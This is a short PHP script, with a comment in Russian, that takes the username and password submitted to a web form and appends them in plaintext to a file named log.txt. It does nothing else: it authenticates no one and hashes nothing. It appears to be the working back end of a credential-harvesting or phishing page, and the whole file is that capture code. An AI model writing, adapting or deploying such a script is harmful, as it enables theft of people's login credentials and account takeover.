<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Открываем файл log.txt для записи
$fp = fopen('log.txt', 'a+');
fwrite($fp, 'Username: ' . $username . "\n");
fwrite($fp, 'Password: ' . $password . "\n");
fwrite($fp, '----------------' . "\n");
fclose($fp);
?>
